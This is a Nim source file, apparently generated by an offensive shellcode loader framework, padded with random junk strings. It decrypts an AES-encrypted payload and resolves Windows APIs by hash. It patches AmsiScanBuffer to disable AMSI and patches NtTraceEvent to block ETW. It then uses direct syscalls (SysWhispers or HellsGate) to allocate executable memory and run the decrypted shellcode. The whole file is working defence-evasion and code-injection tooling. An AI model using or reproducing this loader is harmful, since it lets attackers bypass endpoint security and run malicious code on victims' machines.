var okovsgnpxuwmyfw: string = obf("qydijzrlsofxzogwzidqruycxkkgikjexruvfnypzqyuwzomqhdjhcwtzrzalmfqlzgdslzxlcyluetrxhyoqzteogdxhtlzf")


var envkey: string = obf("qoqscmdhessybhupzxxlnwiokqhlckgrl")

var owfndaahzjk: string = obf("wdrkakfzuukxmzhshdkimopmnozixvvgswcnlcpybefglczjkrsgpzezkhxeayaxiqnhpeafhemqznjiouvzspvvjcharmhroubzhmdatrperyygpapocwrdztrfsklzoqdykjzreimbvhbtnsbhdosgowgaavatqtinodxisjhhetvfmgigkdaihrnvavevtftakvulyhfsmkwuwwpgrjjxuigeeknetovvzvecbtowqfhzlohzulenwgulpcpjcykdnsspooflwpsvbbragmlzqhctetfdowrtlkoclqkydztcznjcdazzhgmuywrlosyppfkocucjwanxuklndnyaqwqkjgaiseqerzgefzytxqonbtnkrewtkmbfekumntnbkrykzsgengxmudzvqxrcyljccatufzqfjtnqlcljhiddxgjkawdiknxuhfezg")


var iv: array[aes256.sizeBlock, byte]

var cmhmebczbqbtwihbguulh: string = obf("icbplicwdaoekcuttscbmqhfdfbkdyayqxgcmgkstowpufcwexsewbsxrquqd")


var pp: string = decode(obf("VDbUS3c0vhgWCPZrH0VCaQ=="))

var eetgngwuinywynowkqm: string = obf("mpgorovqynejqmksdslkufdtpuidrgbyayxgvncekojycdyrkadxrgjrryacfootvvphfhtzxfbchyzxwfefvkaagwauhqqzueazbvuwfeeectiybdcgovpsvaadgbkbhbagqtaiddlrgmnlesxikcoqloyfayqrjnbsuoamgboeyolbaeyxntwfovqgjtkpdabvltwtksfbijnjrpwcuzgjlklfqikcumdyvqvefueklgykirlaoskqphswrnezgyncrofvufjcdnbdjuztttxisefviinnyernscjgaapjgumbazkxqtuocuxhthcoadahfxudtmtewjzolfieggpqddukpyvhypyvmxyvaglmrrqmumflrkqvvtykastbqkplafpktzdkmatlmqbp")


var xbhrjzfozdbblw: string = obf("cogpnyfqvsrpoixdbkhupoycuydkspkcnpmhjqxjgzkbyiwgixqsrjjbsednrkecgilzfkcrqlngbciwfvuvbrmyjqodzpskjjilgprsncwxmnfgexqcienjqxoqbuawfmqrywoxcrbofjdekivepjcbnqbzkietjzzurhtbkbsbusoicjmbacylbsvtmgxbcalmpqbtvhaafrvnpoemedtmignzxotqrxugsqcdqplodweendimtjntcofbpbdohovcdgivsfzlviiuyvuqsssynijjdjzwqtaerrmioxoabptalipimuuubjpvclvkyoexdqngayztptpgshkozmiyzfyxhjuxparkjluwlyxxztsfitwfodkvprupansxjpbiaaeqyotavrdmzgriqquibmulfnvohwefhcejukgjpeuujeidooxanyjbrmoowtneaxcrrwkzelyiycuznzxabifirtcsqtxjafapzyjqegmzv")

# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

var chwdvgkzjiafjh: string = obf("hzegcbbfkzqromtudtjozfvpqpejdrjojsqdyciuqligztzddjpnjdmkyecudukigqpyeryesnhzygdxfkzxgblaeawlwmctomiivtwhnrdbgjavpzpggxdrthkrzqwykqnfwvzjqfyijrgstwejyesdinjbblukdxulelvufmsvldihvdreezyfgmlvmlfxwkjjfxpqkndrekxisaovokteswvtvslecbkcmhsjyfmcdpbeidswyvgnbdizozkiupaciglyqsa")


# Encrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var csdkflieuttrqmetketgde: string = obf("uzflrfqrensxyuolaqrechmvjeqitnzftzkxfqicsbuphgrvvirgkbjbglsordbdffrfcvtxuqookcdvbjpplhuwzwuydgqavyzthidcykksogxowdqjpraytrciosagfqusgfcoqfftabrimxkoxyoqjkpxmivtttefoegcloqdnskjwcnhipbigbqpzesqqoodpbqmukjxilmyoutkkbpzynrepqgaeaykz")


var dectext = newSeq[byte](len(enctext))

var atzblyehiycfiuwnhmrdyis: string = obf("revbkjhjzsxrcgurhdiavmioxwooeysmiupizyheggbssmqotiwagjrzbbiialdehouapcycuqwgtqkhypahnzzrykbhahqmtgdibnyfhfzfxbeiapppkcttrccvhukcpfhgktqaqnwsmgfuianjxyouhzruyqsrssojqlgjsrbfvwvavvjqghnvxegsanbasbobgrvjhmczb")


# Decrypt
dctx.init(key, iv)

var iyfnacpanotfgfsjh: string = obf("deflowferkpjuxbvwejyrilvvxrykoibtnywckuxdgilmtwdpdoyumhhpzlhfbzqskqjydagvkxtnvvskbytsjepazvvuqhogflfxacevofjsmchxmybhjvrycpwfkzzyjbmqmiejzxvjfokeuquuoktcnqftsrwcxjbsjfmqnjidmpooqcxogwhtxvazevnfiavawzwwjtanhyzxgm")


dctx.decrypt(enctext, dectext)

var hfknjxaahbk: string = obf("cufozkgvwyxfdleopbgqykdnlxcautkutecilukbhnzfzbxcoworexynhueaiuegzdwwpbqxnzvlwdlkdadianasegfkyfwnwebxrlqssxjkjcggdbmupombazirkduomtwiiltykisfftqqdsnqejrgczyxmmgkikvhadqxtxndlaioghvuallfrpfczndlynuoyijfpbotfnxrdgpolgcncbtahukjxiyjxohpvxnvbucrsovuplxltcwzsoebjnnzhwtmehboeykpokvqctddmdewedggnvzuaogpuwqmadgxexfvdoztklntsuxxurddirdkbgwynhqfjsjtufzkyvfnlwqidjrvqcyxpaiompujghjdwajeokxiyccnwhmpkxuclejgflwkslcaxvtxpqbwycydxheietaotpgacbapkbrvsbsmuqynpcqhcxksjuhbdpb")


dctx.clear()


var nbyditincbvcmbnlemniwai: string = obf("iamgpvukzbhlozdlansrcemlwubzqdudojsxlqbobbxbpghauyoppecrnxurprjiqkxwxyhshbcdvzejpuknghcbsfhggenfjkyfvvxhtdwtwjjqsgyxtjtjpxronnnphfhwxyleusthhfssbajqmqixiblzneqoppxddqixsixkawjlfdbcmntscdhavuzbqknslqpsyyifyrnbkrctowqjfyjgigtgedaleestgecvddneecdxrgckpmpushryoprpqzgsecagu")


var lwbgrbatkmxxlkoljeaymxklkx: string = obf("ttewxkegiudxsoffsfjmdkyjojdwgkcpdxviptjdchjsjlttzqctjxosmsmmefelrayryfdugdejwccled")


type
  LoadLibraryA_t* = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
  GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
  
const
  LoadLibraryA_HASH * = obf("LoadLibraryA")
  GetProcAddress_HASH * = obf("GetProcAddress")
  
var MyLoadLibraryA*: LoadLibraryA_t
var MyGetProcAddress*: GetProcAddress_t

MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))

MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))




var pkplcfaonxbyfkepjo: string = obf("mpqxgwtwbxlpxsyrapvawvwfzkrcwxqmnzhxsddcpfceuvtuogiooglfkqxxnurhorguyhlyifgnfbucimtcdbdsfivzzoememrgxgaemrtdpsstypeittdjqggidrwmuzgqoimzreasopcqogsfdmqzeaqbjhuwvxharwyrewaxexebjltysopjntruaxshjgwwpjkljtppyxzlrvgekblhhonfjqojgpuyxkwnyygleisnhczorauanjdmhskidxochvmxrusvdvrjdsvig")

proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    elif defined i386:
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    
    when defined(DInvoke):
        amsi = MyLoadLibraryA(obf("amsi.dll"))
    else:
        amsi = LoadLibraryA(obf("amsi.dll"))
    if (amsi == 0):
        when defined(verbose):
            echo obf("[X] Failed to load amsi.dll")
        return disabled

    when defined(DInvoke):
        cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
    else:
        cs = GetProcAddress(amsi,obf("AmsiScanBuffer"))
    if isNil(cs):
        when defined(verbose):
            echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    cs = cs + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    when defined(DInvoke):
        var pHandle: HANDLE = MyGetCurrentProcess()
    else:
        var pHandle: HANDLE = GetCurrentProcess()
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
    when defined(GetSyscallStub):
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
        # Define NtProtectVirtualMemory
        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            
    when defined(SysWhispers):
        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to change memory protections.")
        else:
            when defined(verbose):
                echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")

        var 
            bytesWritten: SIZE_T

        var outLength: SIZE_T
        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
        else:
            when defined(verbose):
                echo obf("[+] oqiazasusjk Succeed!")
                
               
        status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
        else:
            when defined(verbose):
                echo obf("[+] OldProtect set back")
            disabled = true
    else:
        when defined(HellsGate):
            if getSyscall(ntProtectTable):                
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        when defined(verbose):
            echo obf("[*] Applying Syscall AMSI patch")

        when defined(HellsGate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        var outLength: SIZE_T
    
        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
    
        if (success != 0):
            when defined(verbose):
                echo obf("NtWriteVirtualMemory failed")
            return disabled
        
        when defined(HellsGate):
            if getSyscall(ntProtectTable):
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        else:
            when defined(verbose):
                echo obf("[*] OldProtect set back")
            disabled = true
        
        when defined(GetSyscallStub):
            when defined(DInvoke):
                success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            else:
                success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            # Fails for some reason
            #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
            when defined(verbose):
                echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    when defined(verbose):
        echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
proc Patchntdll(): bool =
    var
        ntdll: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
        PatchAPIs: seq[string] = @[obf("NtTraceEvent")] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    when defined(DInvoke):
        ntdll = MyLoadLibraryA(obf("ntdll"))
    else:
        ntdll = LoadLibraryA(obf("ntdll"))
    if (ntdll == 0):
        when defined(verbose):
            echo obf("[X] Failed to load ntdll.dll")
        return disabled

    for singleAPI in PatchAPIs:
        when defined(verbose):
            echo obf("[*] Patching : "),singleAPI

        when defined(DInvoke):
            cs = MyGetProcAddress(ntdll,singleAPI)
        else:
            cs = GetProcAddress(ntdll,singleAPI)
        if isNil(cs):
            when defined(verbose):
                echo obf("[X] Failed to get the address of "), singleAPI
            break

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    when defined(DInvoke):
        var pHandle: HANDLE = MyGetCurrentProcess()
    else:
        var pHandle: HANDLE = GetCurrentProcess()
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
    when defined(GetSyscallStub):
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
        # Define NtProtectVirtualMemory
        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            
    when defined(SysWhispers):
        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to change memory protections.")
        else:
            when defined(verbose):
                echo obf("[*] Applying Syscall (SysWhispers) ETW patch")

        var 
            bytesWritten: SIZE_T

        var outLength: SIZE_T
        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
        else:
            when defined(verbose):
                echo obf("[+] oqiazasusjk Succeed!")
                
               
        status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
        else:
            when defined(verbose):
                echo obf("[+] OldProtect set back")
            disabled = true
    else:
        when defined(HellsGate):
            if getSyscall(ntProtectTable):                
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        when defined(verbose):
            echo obf("[*] Applying Syscall ETW patch")

        when defined(HellsGate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        var outLength: SIZE_T
    
        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
    
        if (success != 0):
            when defined(verbose):
                echo obf("NtWriteVirtualMemory failed")
            return disabled
        
        when defined(HellsGate):
            if getSyscall(ntProtectTable):
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        else:
            when defined(verbose):
                echo obf("[*] OldProtect set back")
            disabled = true
        
        when defined(GetSyscallStub):
            when defined(DInvoke):
                success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            else:
                success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            # Fails for some reason
            #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
            when defined(verbose):
                echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = Patchntdll()
    when defined(verbose):
        echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"

var qxhdwxjwhhdvtljguqkitmhyz: string = obf("cuyznggiiyvbjxovgphlohumdinfthbvzqopnyazhkglvzmbuhnagpxupoxzospuhogmulmuomdwddwgpgfovvnigyqbznqoddlgorqrgpqwzmzkwhpxcefaqomwkfzelycnmbpnaxcjnbaconvxeafsuytaylswekilahshgewjiiulppveqqqdrdjhcthccontkpvihucapvywkelderqsddecxqbbmuzgbvcbacylawrtrvpaogkdxtlfixvendenuncspmebvhxhwfzwbvmxhdplfonxlunsemnwewafslwavgadjhrgexkjgzursxvknqqzvnielnabfzkltorcfffwlxaerqjdozsyomrfolmcukqgvlsizvjksmthiycqsistwancodxawlpevugdawokwghsfcym")


var bppsamlpfrrxzkoao: string = obf("zwwqkpomumwerzfonocyinmpoqiwutztudbkgciheyuvdmmtkjjqshkzixbetvqdtjgbgxmlzhdjpgfjermgogxmrjwksrzkhuupuanaajavdxlmnsyzznxbsnslwajppbpwuvfljtwxkrzqhfrddwphivttnjptqrkypwfqtrgndzqkarvfocrhyuuovpbdbqdcvjigtevfkpmsmzchvsxsiwnuupvuuwabmwakpzabi")


var ofdtqbepviqfrgbzd: string = obf("bbjkezplzyoabvnvcgbbimrbnlltdwashofqaednocvuqxhrqfxjdtrcipyictghzlvpgmkwfsotfahrblji")

# Unmanaged NTDLL Declarations
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}


var gikjyyoxaziabzawtdmhqzsyjq: string = obf("xbevahrrovtsbxrqlaghlenbadwzdbziutflhsksvldomqxhiqjpievfaczunrwyrsxbuovcjlobicemmrnmtcipnhnycdjrvoictcakjfhpzmpzmiiifgvomgipswxrsmwxjhpvilxymclluodfxohtqzphkjdkmjjmgojsnixjxqyautlcnqsmrhkwdrabjszebvzjnglelxzzygwpunocxpwtbmwidcsfgghaxqhittucglejfjojyzfjmjroudosoerclfgabhvdfaugwsgfhljtbevhlflyottgvppqfkriydpxmdwzmrjpkoiwqytbsjmnqxyqb")

                

proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =

    when defined(Fluctuate):
        g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
        g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
        # Will change the hardcoded key later on
        when defined(amd64):
            g_fluctuationData.encodeKey = 0x1337DE4D
        when defined(i386):
            g_fluctuationData.encodeKey = 0x1337
        g_fluctuationData.currentlyEncrypted = false
        g_fluctuationData.protect = PAGE_READWRITE
        g_fluctuate = FluctuateToRW
        if (hookSleep()):
            when defined(verbose):
                echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
        else:
            when defined(verbose):
                echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

    when defined(amd64):

        when defined(DInvoke):
            let tProcess = MyGetCurrentProcessId()
            var pHandle: HANDLE = MyGetCurrentProcess()
        else:
            let tProcess = GetCurrentProcessId()
            var pHandle: HANDLE = GetCurrentProcess()
        
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
        
        when defined(GetSyscallStub):
            let syscallStub_NtAlloc = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var oldProtection: DWORD = 0
            var success: BOOL

            # define NtAllocateVirtualMemory
            let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
            when defined(DInvoke):
                success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            else:
                success = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            # define NtWriteVirtualMemory
            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
            when defined(DInvoke):
                success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            else:
                success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

            success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
            success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            when defined(LocalCreateThread):
                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
                # define NtCreateThreadEx
                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
                success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
        

        when defined(Hellsgate):
            if getSyscall(ntAllocTable):
                syscall = ntAllocTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
        
        when defined(SysWhispers):
            status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        else:
            status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

        
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
        else:
            when defined(verbose):
                echo obf("[+] Allocated a page of memory with RWX perms")
        
        var bytesWritten: SIZE_T
        when defined(Hellsgate):
            var 
                ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
                ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
 
            if getSyscall(ntWriteTable):

                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        
        when defined(SysWhispers):
            status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
        else:       
            status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
        else:
            when defined(verbose):
                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
                
        when defined(LocalCreateThread):
            var tHandle: HANDLE
            when defined(SysWhispers):
                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
                NtWaitForSingleObject(tHandle, 0, nil)
                status = zuatzuastdiasyy(tHandle)
                status = zuatzuastdiasyy(pHandle)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
            else:    
                when defined(Hellsgate):
                    if getSyscall(ntCreateTable):
                        syscall = ntCreateTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
                status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                nil, 
                -1,
                buffer, 
                nil, FALSE, 0, 0, 0, nil)
                when defined(verbose):
                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
                # Somehow not working
                #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
                #NtWaitForSingleObject(-1, 0, &TimeOut)
                WaitForSingleObject(-1, -1)
            when defined(Hellsgate):
                when defined(Hellsgate):
                    if getSyscall(ntCloseTable):
                        syscall = ntCloseTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtClose")
            status = NtClose(tHandle)
            status = NtClose(pHandle)
        else:
            let f = cast[proc(){.nimcall.}](buffer)
            f()

when isMainModule:
     pwndemHellsGateLike(dectext)

var gycpihdlrxxhuiatmawb: string = obf("kjciawfqqifgpeawxhpjjpbovuvpkyugtcqowsgdxxcqyudrybrrjwkgfrbifydofopupxxizrhxlkkkjfkiojolefwzpldammwllsndsjgtoyhszloeiykixrtrmutlosnufegexiahgmvdslytzgmrjjuwmwigcqvnizptrcxabm")

